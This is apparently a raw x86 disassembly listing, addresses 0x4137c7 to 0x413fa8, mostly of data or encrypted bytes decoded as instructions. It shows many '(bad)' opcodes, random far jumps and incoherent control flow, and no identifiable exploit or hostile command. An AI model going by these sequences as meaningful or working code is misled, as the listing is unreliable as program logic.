  4137c7:	cmp    ecx,DWORD PTR [edi-0x28]
  4137ca:	pop    ds
  4137cb:	inc    ebp
  4137cc:	adc    ch,BYTE PTR ds:0x403d4585
  4137d2:	push   esp
  4137d3:	in     al,dx
  4137d4:	aad    0x1b
  4137d6:	mov    ds:0xea73f944,eax
  4137db:	out    0x1b,eax
  4137dd:	je     0x413800
  4137df:	mov    ah,0x9e
  4137e1:	ss mov ecx,0x87f5e5ae
  4137e7:	add    ecx,DWORD PTR [ebp+0x70]
  4137ea:	add    eax,0x29a71c58
  4137ef:	gs inc edx
  4137f1:	jle    0x41378a
  4137f3:	cld    
  4137f4:	mov    esp,0x15a9568
  4137f9:	sbb    eax,0xf11b80a
  4137fe:	fmulp  st(4),st
  413800:	pop    esp
  413801:	adc    BYTE PTR [edx-0x21],cl
  413804:	das    
  413805:	repz xor BYTE PTR [esi+0x2c],dl
  413809:	fwait
  41380a:	dec    esp
  41380b:	shr    DWORD PTR [edi-0x4b7dfc4d],1
  413811:	push   es
  413812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413813:	rcr    dh,1
  413815:	fsubr  QWORD PTR [esi-0x3807fe91]
  41381b:	sar    cl,1
  41381d:	imul   edi,DWORD PTR [ecx-0x1acb22df],0xceabc990
  413827:	mov    bl,bh
  413829:	jle    0x41386b
  41382b:	mov    bh,0x9e
  41382d:	fcomp  QWORD PTR [di]
  413830:	aam    0x43
  413832:	sahf   
  413833:	rcr    ebx,0x30
  413836:	jnp    0x413835
  413838:	stos   BYTE PTR es:[edi],al
  413839:	inc    edx
  41383a:	xor    eax,0xe21b9270
  41383f:	fwait
  413840:	mov    ds:0x5de90edb,al
  413845:	test   BYTE PTR [edi-0x26],0xfd
  413849:	loop   0x413834
  41384b:	sbb    DWORD PTR [esi],eax
  41384d:	das    
  41384e:	das    
  41384f:	leave  
  413850:	push   0x891358ed
  413855:	sub    DWORD PTR [ebx+0x6f],eax
  413858:	(bad)  
  413859:	mov    ds:0x51f7e832,al
  41385e:	lock ja 0x4138c5
  413861:	add    BYTE PTR [ebx+0x73],cl
  413864:	pop    eax
  413865:	or     ebp,0xffffffd2
  413868:	jl     0x4137ff
  41386a:	inc    esi
  41386b:	psubsw mm4,QWORD PTR [edx+0x1a124c2c]
  413872:	mov    ds:0x561ce5fa,eax
  413877:	push   edx
  413878:	adc    ch,al
  41387a:	pop    es
  41387b:	ficom  WORD PTR [ebp+ebx*8-0x1f859622]
  413882:	sub    BYTE PTR [eax+0x7c],ch
  413885:	mov    al,0x26
  413887:	shl    BYTE PTR [esi],cl
  413889:	jns    0x4138f5
  41388b:	and    BYTE PTR [ebx],dh
  41388d:	shl    BYTE PTR [ebp-0x5d],1
  413890:	cmp    DWORD PTR [edx],0xffffffc6
  413893:	lods   eax,DWORD PTR ds:[esi]
  413894:	pop    ecx
  413895:	cmp    DWORD PTR [edx],esi
  413897:	jno    0x4138f1
  413899:	(bad)
  41389c:	xor    dl,BYTE PTR [edi]
  41389e:	(bad)  
  4138a0:	(bad)  [edx-0x64]
  4138a3:	sub    BYTE PTR [ebx+0x44b334],bh
  4138a9:	push   0x2c
  4138ab:	data16 jnp 0x413895
  4138ae:	(bad)  
  4138af:	leave  
  4138b0:	test   eax,0xc4f969d4
  4138b5:	retf   
  4138b6:	sub    al,0xf4
  4138b8:	cwde   
  4138b9:	push   0x68d89
  4138be:	nop
  4138bf:	dec    esp
  4138c0:	add    al,0x7e
  4138c2:	icebp  
  4138c3:	hlt    
  4138c4:	mov    bh,0x94
  4138c6:	dec    edi
  4138c7:	mov    bl,0x66
  4138c9:	jae    0x4138d5
  4138cb:	lea    edx,[esp+ecx*8]
  4138ce:	cmp    eax,0x523250d8
  4138d3:	jle    0x413920
  4138d5:	imul   DWORD PTR [eax+esi*4-0x7]
  4138d9:	lods   eax,DWORD PTR ds:[esi]
  4138da:	cmp    al,0xf
  4138dc:	rol    BYTE PTR ds:0x85f50c21,0xb3
  4138e3:	rol    bl,0x7a
  4138e6:	push   esi
  4138e7:	add    al,0x2a
  4138e9:	jl     0x41388e
  4138eb:	xor    DWORD PTR [edx],esp
  4138ed:	inc    edi
  4138ee:	cmp    eax,0x8cb3051f
  4138f3:	mov    edx,0x1930f468
  4138f8:	sbb    edx,DWORD PTR [eax-0x29354298]
  4138fe:	(bad)  
  4138ff:	cmp    al,0xdb
  413901:	inc    edx
  413902:	cdq    
  413903:	sub    DWORD PTR [ebx+edx*8+0x2c],0xfffbf124
  41390b:	jo     0x4138b3
  41390d:	pop    ebp
  41390e:	loope  0x413983
  413910:	jmp    0x3176:0x979f00e
  413917:	dec    eax
  413918:	dec    esi
  413919:	shl    DWORD PTR [edx-0x6d4d0173],0xe4
  413920:	ins    DWORD PTR es:[edi],dx
  413921:	imul   esp,ebp,0x5b4a999b
  413927:	pop    ebp
  413928:	xor    DWORD PTR [eax+0x6c0ca48f],ecx
  41392e:	jmp    0x413905
  413930:	pop    esp
  413931:	scas   al,BYTE PTR es:[edi]
  413932:	rcl    esi,0x52
  413935:	in     eax,dx
  413936:	sub    eax,0xa9835d43
  41393b:	ss push edx
  41393d:	jbe    0x41396c
  41393f:	or     DWORD PTR [ebx],esp
  413941:	add    DWORD PTR [ebx-0x78],0xd04a986b
  413948:	lea    esp,[edx+0x3f6a7b0f]
  41394e:	and    DWORD PTR [esi],ebx
  413950:	js     0x413930
  413952:	xlat   BYTE PTR ds:[ebx]
  413953:	add    edi,DWORD PTR [ebp-0x4b]
  413956:	scas   eax,DWORD PTR es:[edi]
  413957:	pop    bx
  413959:	ret    0xe344
  41395c:	adc    eax,0xb1d0d27a
  413961:	aam    0xe8
  413963:	sbb    bl,BYTE PTR [ebx+0x11]
  413966:	xchg   edx,eax
  413967:	sub    bl,ah
  413969:	es out 0x79,al
  41396c:	sar    DWORD PTR [edi],0x42
  41396f:	xchg   ecx,eax
  413970:	pop    ecx
  413971:	js     0x413984
  413973:	sbb    al,0x5d
  413975:	test   al,0xd9
  413977:	inc    ebx
  413978:	outs   dx,BYTE PTR ds:[esi]
  413979:	je     0x413978
  41397b:	jns    0x4139ca
  41397d:	xchg   esi,eax
  41397e:	arpl   WORD PTR [ebx+0x1b],bx
  413981:	pop    esi
  413982:	hlt    
  413983:	xchg   ecx,eax
  413984:	jecxz  0x413984
  413986:	jae    0x41393f
  413988:	into   
  413989:	jb     0x4139c0
  41398b:	loop   0x413a0b
  41398d:	clc    
  41398e:	out    0xd,eax
  413990:	popa   
  413991:	test   BYTE PTR [ecx+eax*8+0x12],al
  413995:	pop    ebp
  413996:	popa   
  413997:	jecxz  0x4139f5
  413999:	mov    eax,ds:0x714f723b
  41399e:	icebp  
  41399f:	fsubr  st(7),st
  4139a1:	pop    ss
  4139a2:	inc    esp
  4139a3:	gs hlt 
  4139a5:	mov    cl,0x4c
  4139a7:	or     DWORD PTR [edx-0x3c6c1eb],ebx
  4139ad:	je     0x4139bd
  4139af:	mov    bh,0xe6
  4139b1:	dec    ebx
  4139b2:	repnz nop
  4139b4:	fstp   QWORD PTR [ecx+0x74]
  4139b7:	sbb    DWORD PTR [edx+0xf],edi
  4139ba:	cmc    
  4139bb:	push   ecx
  4139bc:	or     esi,DWORD PTR [ebx-0x739c849d]
  4139c2:	out    0x60,eax
  4139c4:	add    DWORD PTR [edi-0x612221c0],esi
  4139ca:	sar    DWORD PTR [edx+0x2c5b17b0],cl
  4139d0:	inc    ecx
  4139d1:	(bad)  
  4139d2:	sbb    DWORD PTR [ecx+0x12],edx
  4139d5:	addr16 ja 0x413a07
  4139d8:	popa   
  4139d9:	or     dh,dl
  4139db:	int3   
  4139dc:	jmp    0x4139c1
  4139de:	ss jae 0x413a49
  4139e1:	inc    ecx
  4139e2:	inc    ebx
  4139e3:	pop    edx
  4139e4:	inc    ebp
  4139e5:	mov    ah,bh
  4139e7:	inc    eax
  4139e8:	rol    edi,0xcb
  4139eb:	arpl   WORD PTR [edx-0x173751f5],si
  4139f1:	jp     0x413982
  4139f3:	or     BYTE PTR fs:0x69c286e5,dl
  4139fa:	fimul  WORD PTR [eax]
  4139fc:	(bad)  
  4139fe:	dec    edi
  4139ff:	ins    DWORD PTR es:[edi],dx
  413a00:	aam    0x8c
  413a02:	sub    al,0xab
  413a04:	call   0x87149eb3
  413a09:	js     0x413a7c
  413a0b:	pusha  
  413a0c:	or     BYTE PTR [ebp-0x6f],bh
  413a0f:	xor    eax,0xbf9f6deb
  413a14:	xlat   BYTE PTR ds:[ebx]
  413a15:	pop    es
  413a16:	scas   al,BYTE PTR es:[edi]
  413a17:	aad    0x2b
  413a19:	(bad)  
  413a1a:	and    dl,BYTE PTR [edx-0x7e7c67c3]
  413a20:	jno    0x4139b0
  413a22:	retf   0x4856
  413a25:	std    
  413a26:	xchg   ebp,eax
  413a27:	add    bh,BYTE PTR [ecx+0x4bbf97a9]
  413a2d:	jae    0x4139d3
  413a2f:	ror    DWORD PTR [esi+ecx*1+0x3ef6ee14],cl
  413a36:	jae    0x413a35
  413a38:	mov    dl,0xd1
  413a3a:	sbb    eax,0xf65e5a39
  413a3f:	xchg   edx,eax
  413a40:	pop    DWORD PTR [esp+eax*1-0x3e87fc4a]
  413a47:	xchg   ebx,eax
  413a48:	fwait
  413a49:	push   ecx
  413a4a:	fdivr  st,st(0)
  413a4c:	pusha  
  413a4d:	pop    esi
  413a4e:	push   ss
  413a4f:	imul   edx,DWORD PTR [eax],0x45
  413a52:	or     al,0x2a
  413a54:	push   ebx
  413a55:	sub    BYTE PTR [esi-0x29b287cf],dl
  413a5b:	and    DWORD PTR [edi-0x5ca6af59],esp
  413a61:	ror    DWORD PTR [ecx+0x5b61d325],0x1f
  413a68:	mov    ss,WORD PTR [ebp-0x3ef96bb6]
  413a6e:	mov    ebx,0xafb2226f
  413a73:	pop    eax
  413a74:	test   ecx,ebx
  413a76:	stc    
  413a77:	aas    
  413a78:	test   esp,edi
  413a7a:	xchg   ecx,eax
  413a7b:	pop    edi
  413a7c:	nop
  413a7d:	and    edx,0xc8312078
  413a83:	xor    al,0xed
  413a85:	pushf  
  413a86:	sub    DWORD PTR [edi+0x4212680],0x88299330
  413a90:	out    0x17,al
  413a92:	and    al,cl
  413a94:	bound  eax,QWORD PTR [ebx+0x45]
  413a97:	mov    eax,0x1dab5779
  413a9c:	(bad)  
  413a9d:	adc    DWORD PTR ds:0x61a1d2ea,esi
  413aa3:	(bad)  
  413aa4:	es daa 
  413aa6:	adc    BYTE PTR [ecx-0x28c051b7],0xab
  413aad:	mov    esp,0x30738f24
  413ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ab3:	imul   ecx,DWORD PTR [edi-0x5],0x55fe5813
  413aba:	aam    0x26
  413abc:	lock popa 
  413abe:	sub    ch,BYTE PTR [ebp-0x71]
  413ac1:	popa   
  413ac2:	xor    esi,DWORD PTR [esp+eiz*8-0x26]
  413ac6:	and    DWORD PTR [ecx-0x2f46fbc8],ebp
  413acc:	jne    0x413a52
  413ace:	pop    eax
  413acf:	or     eax,0x60c0c9c
  413ad4:	dec    eax
  413ad5:	shr    DWORD PTR [ebp+0x57b3ba35],0x3b
  413adc:	and    DWORD PTR [ebx+0x5e],0x65
  413ae0:	cdq    
  413ae1:	test   DWORD PTR [eax+eax*4],esi
  413ae4:	sbb    dh,dh
  413ae6:	mov    BYTE PTR [eax-0x2ca38924],ah
  413aec:	and    bl,ch
  413aee:	pusha  
  413aef:	push   cs
  413af0:	xor    edx,ebx
  413af2:	fnsave [edx]
  413af4:	mov    bl,0x4f
  413af6:	push   es
  413af7:	dec    ecx
  413af8:	(bad)
  413afc:	xchg   esi,eax
  413afd:	and    eax,0x3febc3e1
  413b02:	call   edi
  413b04:	sti    
  413b05:	pop    esp
  413b06:	xor    eax,0x37b5b1b6
  413b0b:	lods   al,BYTE PTR ds:[esi]
  413b0c:	aas    
  413b0d:	ror    BYTE PTR [ebx+0x1f],cl
  413b10:	es or  ecx,esp
  413b13:	mov    eax,esi
  413b15:	and    eax,0xa3837e17
  413b1a:	xor    bl,BYTE PTR [edi-0x75]
  413b1d:	xchg   edx,eax
  413b1e:	cmp    BYTE PTR ds:0x5d655c7d,0xa3
  413b25:	adc    al,0xec
  413b27:	nop
  413b28:	imul   esi,DWORD PTR [ecx+0x7f],0xffffffd0
  413b2c:	jno    0x413aed
  413b2e:	dec    eax
  413b2f:	loopne 0x413aba
  413b31:	sbb    DWORD PTR [ebx],ebx
  413b33:	sub    ch,BYTE PTR [ebp+ecx*8-0x71d7083a]
  413b3a:	and    ah,BYTE PTR [ebx+0x3ca7547e]
  413b40:	jg     0x413b36
  413b42:	inc    ebp
  413b43:	adc    al,ah
  413b45:	jp     0x413b1c
  413b47:	es add al,0x8d
  413b4a:	cmp    eax,0x4ad42581
  413b4f:	dec    ecx
  413b50:	add    BYTE PTR ds:0x20f0bba2,bh
  413b56:	rol    BYTE PTR [edx+0x3626779c],cl
  413b5c:	push   es
  413b5d:	ins    BYTE PTR es:[edi],dx
  413b5e:	xchg   esp,eax
  413b5f:	ret    0xfad5
  413b62:	repz fcom QWORD PTR [edi-0xe]
  413b66:	test   eax,0x6158027a
  413b6b:	into   
  413b6c:	inc    esp
  413b6d:	sbb    BYTE PTR [esi+0x7f],cl
  413b70:	imul   ebx,esp,0xffffffa5
  413b73:	scas   al,BYTE PTR es:[edi]
  413b74:	xlat   BYTE PTR ds:[ebx]
  413b75:	adc    ecx,DWORD PTR [edx-0x2f6bc4a7]
  413b7b:	or     al,0x9
  413b7d:	pop    ss
  413b7e:	or     al,0xf6
  413b80:	pop    ds
  413b81:	sahf   
  413b82:	push   es
  413b83:	es push ds
  413b85:	dec    ecx
  413b86:	idiv   DWORD PTR [ecx+eax*1+0x70]
  413b8a:	aas    
  413b8b:	add    esp,edi
  413b8d:	popf   
  413b8e:	adc    DWORD PTR [edi],ebx
  413b90:	stos   BYTE PTR es:[edi],al
  413b91:	xchg   edx,eax
  413b92:	adc    al,BYTE PTR [ecx]
  413b94:	inc    edx
  413b95:	push   ebx
  413b96:	sub    BYTE PTR [esp+eax*4+0x4e],ch
  413b9a:	aas    
  413b9b:	pop    edi
  413b9c:	je     0x413b48
  413b9e:	sbb    DWORD PTR [ebp-0x6b5dbd12],esp
  413ba4:	dec    ecx
  413ba5:	pop    ds
  413ba6:	cli    
  413ba7:	sbb    eax,0xf658286b
  413bac:	or     bh,bh
  413bae:	sub    DWORD PTR [ecx-0x36362f18],ebp
  413bb4:	sub    DWORD PTR [ebx-0x1],ebx
  413bb7:	cmp    esp,DWORD PTR [ebp-0x15]
  413bba:	mov    ds:0x70453fa2,eax
  413bbf:	jns    0x413b77
  413bc1:	jns    0x413bce
  413bc3:	sti    
  413bc4:	add    cl,BYTE PTR [edi+0x58122609]
  413bca:	pop    ebx
  413bcb:	mov    BYTE PTR [esi-0x12],0xfd
  413bcf:	and    eax,0x5c3a5073
  413bd4:	mov    al,0xa9
  413bd6:	fldcw  WORD PTR [edx]
  413bd8:	mov    ecx,DWORD PTR ds:0xa2ce4d67
  413bde:	mov    ch,0x55
  413be0:	push   es
  413be1:	pop    ss
  413be2:	inc    esi
  413be3:	fnstenv [esi+ecx*2]
  413be6:	pop    esp
  413be7:	jnp    0x413c4e
  413be9:	inc    ebx
  413bea:	mov    ah,0x8d
  413bec:	jle    0x413bad
  413bee:	and    DWORD PTR [edi+0x47],ecx
  413bf1:	lds    eax,FWORD PTR [edi]
  413bf3:	push   ebp
  413bf4:	cwde   
  413bf5:	mov    bl,0x8e
  413bf7:	mov    WORD PTR [esi],ss
  413bf9:	xor    BYTE PTR [esi+0x65],0x9
  413bfd:	jne    0x413bd1
  413bff:	jo     0x413bb9
  413c01:	adc    DWORD PTR [edi-0x26fa0fbf],ebx
  413c07:	test   BYTE PTR [ebx+eax*1-0x4f],cl
  413c0b:	shr    DWORD PTR [eax*8-0x6de0582c],1
  413c12:	fs inc ecx
  413c14:	pop    ecx
  413c15:	sbb    edi,ebp
  413c17:	ds push 0xfffffffb
  413c1a:	test   ebp,esp
  413c1c:	(bad)  
  413c1d:	jl     0x413c5d
  413c1f:	test   DWORD PTR [ecx+eax*4],eax
  413c22:	push   ecx
  413c23:	cmp    bl,BYTE PTR [eax-0x59b01591]
  413c29:	xchg   ebx,eax
  413c2a:	push   ds
  413c2b:	lods   al,BYTE PTR ds:[esi]
  413c2c:	aas    
  413c2d:	mov    ah,0x7e
  413c2f:	popf   
  413c30:	not    BYTE PTR [ebp+0x73]
  413c33:	cmp    eax,0xa187686e
  413c38:	mov    edi,DWORD PTR [ecx+0xfb74d39]
  413c3e:	int3   
  413c3f:	mov    DWORD PTR [edx],esp
  413c41:	sub    BYTE PTR [esi-0x7b],dl
  413c44:	(bad)
  413c48:	inc    ebx
  413c49:	dec    esi
  413c4a:	sbb    edx,DWORD PTR [edi-0x57bed929]
  413c50:	out    dx,al
  413c51:	(bad)  
  413c53:	mov    edx,0x30db84e
  413c58:	push   0xe
  413c5a:	pop    ss
  413c5b:	retf   
  413c5c:	data16 (bad) 
  413c5e:	in     eax,dx
  413c5f:	xor    bl,0x1e
  413c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c63:	into   
  413c64:	sbb    eax,0x85cbabdb
  413c69:	pop    edi
  413c6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c6b:	mov    ebp,0x6a1f4182
  413c70:	mov    edi,0x2b5e8e04
  413c75:	sub    al,0x3f
  413c77:	add    BYTE PTR [ebx],al
  413c79:	jae    0x413c6a
  413c7b:	cmc    
  413c7c:	test   BYTE PTR [esp+edi*4+0x1b],0x95
  413c81:	in     al,0x26
  413c83:	pusha  
  413c84:	push   0x142ee068
  413c89:	pop    es
  413c8a:	loope  0x413c5d
  413c8c:	sbb    cl,al
  413c8e:	ja     0x413cc6
  413c90:	icebp  
  413c91:	adc    DWORD PTR [edi-0x37],ebx
  413c94:	mov    ah,0x34
  413c96:	xchg   ecx,eax
  413c97:	inc    esp
  413c98:	cmp    bh,bh
  413c9a:	sub    eax,0xbc4919a1
  413c9f:	fimul  WORD PTR [ecx-0x6d]
  413ca2:	cmp    eax,0x726eda02
  413ca7:	jp     0x413c39
  413ca9:	je     0x413ce3
  413cab:	cdq    
  413cac:	ret    0x9d57
  413caf:	and    esp,edi
  413cb1:	nop
  413cb2:	dec    edi
  413cb3:	cmp    eax,0x87451518
  413cb8:	pop    ecx
  413cb9:	dec    ecx
  413cba:	(bad)  
  413cbb:	loopne 0x413d3a
  413cbd:	arpl   WORD PTR [edx+0x7a],di
  413cc0:	inc    esi
  413cc1:	scas   al,BYTE PTR es:[edi]
  413cc2:	test   al,0xd1
  413cc4:	ss mov eax,0x45a6ac63
  413cca:	std    
  413ccb:	icebp  
  413ccc:	aam    0xe0
  413cce:	pop    edx
  413ccf:	std    
  413cd0:	jmp    0x2ed1:0xd22c0666
  413cd7:	mov    bl,0x5f
  413cd9:	mov    esp,0xd17f30e4
  413cde:	and    al,0x73
  413ce0:	adc    al,0xa8
  413ce2:	les    edi,FWORD PTR [eax]
  413ce4:	dec    esp
  413ce5:	dec    esp
  413ce6:	sbb    DWORD PTR [ebx-0x65],edi
  413ce9:	jae    0x413d1f
  413ceb:	xor    eax,0xd70a1560
  413cf0:	push   edi
  413cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cf2:	inc    esi
  413cf3:	fidiv  DWORD PTR [ebx-0x31]
  413cf6:	or     eax,0xccdcde2e
  413cfb:	rcl    edi,cl
  413cfd:	cwde   
  413cfe:	stos   DWORD PTR es:[edi],eax
  413cff:	xchg   edi,eax
  413d00:	xlat   BYTE PTR ds:[ebx]
  413d01:	inc    ebp
  413d02:	outs   dx,BYTE PTR ds:[esi]
  413d03:	sbb    DWORD PTR [edx-0x78],edx
  413d06:	xlat   BYTE PTR ds:[ebx]
  413d07:	pusha  
  413d08:	mov    DWORD PTR [esi],ecx
  413d0a:	sar    DWORD PTR [ebp-0xcf976a],0x14
  413d11:	stos   DWORD PTR es:[edi],eax
  413d12:	fcom   DWORD PTR [ecx]
  413d14:	push   ebx
  413d15:	and    DWORD PTR [ebx],ebx
  413d17:	push   esp
  413d18:	fisub  WORD PTR [ebx]
  413d1a:	xchg   esp,eax
  413d1b:	jns    0x413d4a
  413d1d:	in     al,dx
  413d1e:	outs   dx,DWORD PTR ds:[esi]
  413d1f:	pop    edi
  413d20:	out    dx,eax
  413d21:	dec    ebx
  413d22:	jne    0x413cdf
  413d24:	inc    edx
  413d25:	rcr    bl,0x44
  413d28:	sbb    BYTE PTR [edx],ah
  413d2a:	lods   al,BYTE PTR ds:[esi]
  413d2b:	pop    eax
  413d2c:	jbe    0x413d42
  413d2e:	aaa    
  413d2f:	xor    eax,0x2cd71a84
  413d34:	popf   
  413d35:	add    eax,esp
  413d37:	add    DWORD PTR [edx+0x73],esp
  413d3a:	leave  
  413d3b:	popf   
  413d3c:	jge    0x413db6
  413d3e:	mov    bl,0xf9
  413d40:	int3   
  413d41:	fs push esi
  413d43:	mov    DWORD PTR [eax],eax
  413d45:	or     ebx,DWORD PTR [edx+0x75]
  413d48:	adc    al,cl
  413d4a:	xor    al,bh
  413d4c:	lea    esi,[edi]
  413d4e:	in     al,0x5a
  413d50:	and    BYTE PTR [eax-0x63f714af],bh
  413d56:	call   0xa82e7e08
  413d5b:	add    ah,BYTE PTR [ecx]
  413d5d:	add    al,0x9f
  413d5f:	pop    edx
  413d60:	dec    ebp
  413d61:	bound  eax,QWORD PTR [ebx+0x69]
  413d64:	mov    DWORD PTR [ebp+edi*4-0x48fb0508],0xb9049031
  413d6f:	push   ss
  413d70:	(bad)  
  413d71:	arpl   WORD PTR [edi+0x20ae988c],ax
  413d77:	scas   eax,DWORD PTR es:[edi]
  413d78:	mov    bl,0xd7
  413d7a:	cmp    dh,BYTE PTR [eax-0x21370ecf]
  413d80:	call   0x3be142f1
  413d85:	xor    ah,BYTE PTR [esi-0x4f6ef955]
  413d8b:	add    al,0x9c
  413d8d:	and    al,dh
  413d8f:	fld    TBYTE PTR [edi]
  413d91:	adc    eax,0xd5620c75
  413d96:	fcomp  QWORD PTR [esi]
  413d98:	jb     0x413d72
  413d9a:	cmp    al,0xed
  413d9c:	jno    0x413d33
  413d9e:	inc    ecx
  413d9f:	out    dx,eax
  413da0:	hlt    
  413da1:	inc    ecx
  413da2:	xor    DWORD PTR [ebx+0x5167731b],ebx
  413da8:	(bad)  
  413da9:	retf   0x791f
  413dac:	popa   
  413dad:	sbb    al,ah
  413daf:	push   esi
  413db0:	mov    eax,edi
  413db2:	loopne 0x413dff
  413db4:	jge    0x413d44
  413db6:	xor    dh,BYTE PTR ds:0x7a02dc99
  413dbc:	mov    ebx,0xfccce49f
  413dc1:	(bad)  
  413dc2:	in     al,dx
  413dc3:	aaa    
  413dc4:	adc    ecx,DWORD PTR [eax+0x5d]
  413dc7:	imul   esp,DWORD PTR [esi],0x76
  413dca:	jp     0x413dab
  413dcc:	mov    bl,0xfb
  413dcf:	dec    esi
  413dd0:	loope  0x413dce
  413dd2:	sub    esp,DWORD PTR [eax+0x42]
  413dd5:	push   0x7d4e9bfa
  413dda:	inc    edi
  413ddb:	shr    BYTE PTR [ecx-0x67],0xae
  413ddf:	mov    esp,0x44f89fd0
  413de4:	data16 add al,0x1c
  413de7:	lahf   
  413de8:	call   0xfc95:0x8757f198
  413def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413df0:	add    edx,DWORD PTR [eax]
  413df2:	ret    0x84cf
  413df5:	or     ecx,DWORD PTR [esi+0xafcad24]
  413dfb:	rcl    edi,0x1
  413dfe:	jns    0x413dec
  413e00:	and    eax,0x29400e21
  413e05:	outs   dx,DWORD PTR ds:[esi]
  413e06:	stc    
  413e07:	lahf   
  413e08:	daa    
  413e09:	dec    esp
  413e0a:	mov    ds:0xf5226be3,al
  413e0f:	sub    BYTE PTR [ebx+0x50],ah
  413e12:	push   ds
  413e13:	call   0x5af5:0x49f52dc0
  413e1a:	jb     0x413e25
  413e1c:	pop    edi
  413e1d:	lock ss (bad) 
  413e20:	mov    al,ds:0x364425de
  413e25:	lods   al,BYTE PTR ds:[esi]
  413e26:	cmp    eax,0x232b7c3
  413e2b:	mov    WORD PTR [edi+0x79],?
  413e2e:	repnz popf 
  413e30:	mov    bl,0xc3
  413e32:	pusha  
  413e33:	mov    al,0x50
  413e35:	test   eax,0x14f7b82b
  413e3a:	jl     0x413dee
  413e3c:	ficom  DWORD PTR [ebx+0x11]
  413e3f:	loope  0x413e25
  413e41:	add    cl,BYTE PTR [ecx-0x191d218d]
  413e47:	xor    DWORD PTR [edi],ebx
  413e49:	inc    ebx
  413e4a:	sub    eax,0x81691ad6
  413e4f:	inc    eax
  413e50:	xchg   esp,eax
  413e51:	out    0x4a,eax
  413e53:	fwait
  413e54:	inc    eax
  413e55:	je     0x413e5b
  413e57:	jmp    0x413e69
  413e59:	adc    DWORD PTR [edx+0x1e6a44],0x845a6e34
  413e63:	xor    cl,BYTE PTR [ebp-0x256b4dd6]
  413e69:	sub    eax,0x3297d916
  413e6e:	add    BYTE PTR [ebx+0x2e760200],cl
  413e74:	iret   
  413e75:	addr16 (bad) 
  413e78:	daa    
  413e79:	mov    ds:0xc6ccf9b4,al
  413e7e:	cmp    BYTE PTR [ebx-0x6e9f4a1e],cl
  413e84:	xchg   edx,eax
  413e85:	mov    eax,0x17c472bb
  413e8a:	xor    BYTE PTR [ebx-0x4c],bh
  413e8d:	jecxz  0x413e2a
  413e8f:	inc    esp
  413e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e92:	fidivr DWORD PTR [ecx-0xe]
  413e95:	or     cl,BYTE PTR [edi+0x2e]
  413e98:	rol    DWORD PTR [edx],cl
  413e9a:	mov    DWORD PTR [edi],ebx
  413e9c:	loope  0x413f0e
  413e9e:	pop    ecx
  413e9f:	mov    esi,cs
  413ea1:	fucomip st,st(7)
  413ea3:	leave  
  413ea4:	cmp    eax,0xa66dd293
  413ea9:	cmc    
  413eaa:	(bad)  [esi+ebp*1+0x6cacb0a2]
  413eb1:	jb     0x413e42
  413eb3:	scas   eax,DWORD PTR es:[edi]
  413eb4:	add    bh,ah
  413eb6:	idiv   DWORD PTR [eax]
  413eb8:	adc    al,0xa7
  413eba:	imul   eax,esp,0x4b
  413ebd:	out    0xd9,eax
  413ebf:	imul   eax,DWORD PTR [ebp-0x43],0x4a
  413ec3:	and    eax,0x29cbfe15
  413ec8:	mov    esp,0x992cc3f7
  413ecd:	imul   ebx,DWORD PTR [ebp-0x7db45693],0x49
  413ed4:	mov    al,0x56
  413ed6:	push   esi
  413ed7:	stos   BYTE PTR es:[edi],al
  413ed8:	pop    ebx
  413ed9:	mov    dl,0xd3
  413edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413edc:	scas   eax,DWORD PTR es:[edi]
  413edd:	test   al,0x42
  413edf:	rol    BYTE PTR [edx+ebx*8-0x2e879794],cl
  413ee6:	pushf  
  413ee7:	mov    dl,0x5
  413ee9:	cmp    al,0x27
  413eeb:	test   al,0x37
  413eed:	dec    edi
  413eee:	fadd   QWORD PTR [ebp+0x7f]
  413ef1:	inc    esi
  413ef2:	add    BYTE PTR [edx+0x54a790da],0x81
  413ef9:	not    DWORD PTR [ebx]
  413efb:	jno    0x413f58
  413efd:	push   esp
  413efe:	or     eax,0xfa44dc3f
  413f03:	mov    WORD PTR ds:0xaa759537,ss
  413f09:	xor    ecx,DWORD PTR ds:0x993cbfc4
  413f0f:	cs add eax,0xd68a99be
  413f15:	sti    
  413f16:	in     eax,0x97
  413f18:	and    ch,ah
  413f1a:	pop    ebp
  413f1b:	lea    eax,[ebx-0x18]
  413f1e:	jg     0x413ecb
  413f20:	jmp    0x8248:0xa4c35b5a
  413f27:	mov    bh,0x3c
  413f29:	xchg   edi,eax
  413f2a:	sbb    BYTE PTR ss:[edi+ebp*4-0xb9f3359],0x40
  413f33:	inc    ebx
  413f34:	inc    BYTE PTR [edi+0x40d58b33]
  413f3a:	mov    al,0x72
  413f3c:	test   DWORD PTR [edi-0x1c85e8ff],ebx
  413f42:	xchg   edx,eax
  413f43:	test   DWORD PTR [ebx],edx
  413f45:	lea    esi,[ebx+0x1f6fad]
  413f4b:	sbb    BYTE PTR [ecx-0x29],0xe0
  413f4f:	jg     0x413f17
  413f51:	loopne 0x413fa9
  413f53:	inc    si
  413f55:	push   es
  413f56:	cdq    
  413f57:	jmp    0x413f10
  413f59:	shl    esp,0x5f
  413f5c:	shl    DWORD PTR [edx-0x2d8c9ae8],0x9d
  413f63:	push   cs
  413f64:	xchg   DWORD PTR [edx+0x69926d70],edi
  413f6a:	call   0xcf05:0x5d73c7fc
  413f71:	fimul  DWORD PTR [eax+0x1b]
  413f74:	scas   eax,DWORD PTR es:[edi]
  413f75:	nop
  413f76:	cwde   
  413f77:	jmp    FWORD PTR [eax-0x75]
  413f7a:	loop   0x413fda
  413f7c:	fadd   st,st(3)
  413f7e:	sub    bh,BYTE PTR [edi-0x38]
  413f81:	pop    ebp
  413f82:	push   ds
  413f83:	dec    esp
  413f84:	mov    eax,0x6bae8ba9
  413f89:	jmp    0x413ff5
  413f8b:	dec    edx
  413f8c:	mov    ebx,0x9c42cf37
  413f91:	mov    esi,DWORD PTR [ecx+0x1f]
  413f94:	shr    BYTE PTR [edx+0x4a3a371f],1
  413f9a:	mov    edx,DWORD PTR [ebp+0x8]
  413f9d:	mov    ebx,DWORD PTR [ebp-0x8]
  413fa0:	xor    edx,eax
  413fa2:	xor    ebx,eax
  413fa4:	sub    edx,ebx
  413fa6:	sub    edx,esi
  413fa8:	xor    edx,eax
